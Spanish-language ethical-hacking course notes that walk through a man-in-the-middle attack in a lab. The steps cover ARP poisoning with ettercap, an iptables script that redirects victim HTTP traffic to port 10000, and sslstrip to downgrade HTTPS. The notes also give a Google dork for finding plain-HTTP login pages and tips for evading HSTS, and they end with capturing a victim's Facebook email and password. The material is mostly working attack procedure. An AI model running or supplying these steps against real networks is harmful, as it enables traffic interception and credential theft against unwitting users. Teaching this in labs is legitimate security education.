# FCEH_Unidad 26: Ataque Man In The Middle (MITM)



Lo primero es el iptables. Para realizar esta práctica es necesario ejecutarlo con el comando ./iptables.sh desde el directorio en el que lo hemos creado, así lograremos desviar el tráfico de la víctima. También es importante el sslstrip para las web SSL o “seguras”, de forma que pasemos ese tráfico cifrado a texto plano. Al ejecutar ambas aplicaciones debemos ver que no nos de un error.

El error de iptables más frecuente dice algo así:

```bash
iptables: No chain/target/match by that name.
iptables: Bad policy name. Run `dmesg’ for more information.
‘ptables v1.6.2: Invalid target name `MASQUERADE
Try `iptables -h’ or ‘iptables –help’ for more information.
“ptables v1.6.2: REDIRECT: Bad value for “–to-ports” option: “10000
Try `iptables -h’ or ‘iptables –help’ for more information.
```

Este error puede ser por varios motivos. El más frecuente es por escribir el iptables en Windows y pasarlo a Linux. En muchas ocasiones nos mete lo que se llama retorno de carro, unos caracteres que aunque no se vean nos causarán errores en Linux. Para evitar esto, lo mejor es escribir el iptables en Linux directamente.

También, aunque menos frecuente, es que alguno de los módulos necesarios para el iptables esté dañado o simplemente no esté. Para ver estos módulos podemos usar el comando:

```bash
lsmod | grep ip
```

Veremos todos los módulos IP del sistema que son usados por iptables, junto a otras aplicaciones, aunque pueden variar de nombre, los principales son ip_tables, iptable_filter y el nf_conntrack (o ip_conntrack). Si alguno de estos faltase, habría que ejecutar el comando:

```bash
modprobe <Módulo_que_falte>
```

Otro problema típico de esta lección es que no capturamos datos. Suponiendo que todo el proceso esté realizado correctamente, lo primero es buscar y verificar que con tráfico del puerto 80 esté funcionando, para ello en Google podemos buscar páginas no SSL (https) por ejemplo que tengan la web de acceso login.php, para ello en Google ponemos el comando siguiente:

```bash
inurl:http inurl:login.php
```

En principio este tipo de tráfico no debe dar problemas. Seguimos con las webs seguras. Para ello y forzar estas webs, podemos editar el iptables y copiar y pegar la línea que redirecciona el tráfico al puerto 10.000 y en esta segunda línea redireccionar el puerto 443 al 10.000 igual que hemos hecho con el tráfico del puerto 80.

Ya con esto muchas webs seguras deben funcionar, pero algunas seguirán sin capturar las credenciales. Esto es debido a un sistema de protección llamado HSTS, el cual mete una cabecera web al navegador de los visitantes, que una vez visitada su web, les obliga a usar el tráfico por SSL durante un tiempo determinado en dicha cabecera web. Este es un sistema relativamente reciente implantado en algunas webs, cada vez en más, para hacer las pruebas os recomiendo no visitar antes la web original o usar otro navegador diferente cuando realicéis el ataque, así no tendrá cacheada esta cabecera.

Recursos: Datos del archivo iptables.sh:

```bash

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -F
iptables -X
iptables -Z
iptables -t nat -F

iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
# hay que tener en cuenta que puede ser eth0, eth1, wlan0... o la red que nos de el ifconfig. 
iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 10000 #este puerto nos lo da ettercap

iptables-save > /etc/iptables.up.rules
```

Comprobar q está levantado el ip forwardin con el comando:

```
root@kali:~#  cat /proc/sys/net/ipv4/ip_forward
```
Si devuelve 1 está funcionando, si no volver a lanzar el archivo iptables.sh
### MITM

Con este ataque básicamente lo que hacemos es hacer creer a la máquina victima que somos el router, y al router que somos la máquina víctima.

### Pasos:

Tenemos una maquina virtual de Windows abierta, y levantamos un kali también. 

Hacemos un ifconfig en kali para ver que ip tenemos y red tenemos.

En Kali, dentro de *Aplicaciones* vamos a *Husmeando y envenenando* y seleccionamos el ettercap. Lo arrancamos y seguimos los siguintes pasos:

1. Dar a *Snif/Unified sniffing* y seleccionamos la red que tenemos .

2. Vamos a ver que host tenemos, así que en el menú *Hosts/Scan for host*, lo que nos dará una serie de hosts, y podemos verlos en *Host/Host list*

3. Vamos a la maquina virtual de Windows y en la consola ponemos el comando:

```bash
arp -a
```

Esto nos lista las ips de Windows. 

4. ir al menú *MIT/ARP Poisoning* y marcamos el primero, *Sniff remote connections*

5. *Star/Start snifing*

6. Esperamos un poco y volvemos a la maquina victima de win y volvemos a poner 

```bash
arp -a
```

Y deberíamos ver como las ip's han cambiado, y toma como router nuestra dirección del kali.

7. Ir de nuevo a Kali y abrir otra consola. Hacer un ls para confirmar q estamos en root y luego crear un archivo con 

```bash
nano iptables.sh
```

Y ponemos el contenido descrito anteriormente:

```bash

echo 1 > /proc/sys/net/ipv4/ip_forward

iptables -F
iptables -X
iptables -Z
iptables -t nat -F

iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE
# hay que tener en cuenta que puede ser eth0, eth1, wlan0... o la red que nos de el ifconfig. 
iptables -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-port 10000 #este puerto nos lo da ettercap

iptables-save > /etc/iptables.up.rules
```

8. Tras esto damos permisos al archvo de iptalbes:

```bash
chmod 777 iptables.sh
```

9. Ejecutamos el archivo iptalbes:

```bash 
./iptables.sh
```

10. Tas esto hay que habilitar un puerto SSL por el que redirigir el tráfico, para que las páginas con seguridad https nos dejen navegar a ellas. Esto se hace ocn una palicaión de Kali que se llama *sslstrip*, que redirige por el puerto 443 todo el tráfico de nuestro puerto 10000. Para levantarlo en la consola ponemos:

```bash
sslstrip -f -l 10000
```

11. Navegar con la maquina de Windows a una pagina como facebook y loguearse, veremos como ettercap nos da email y contraseña. 

Y así es como se monta un MITM.
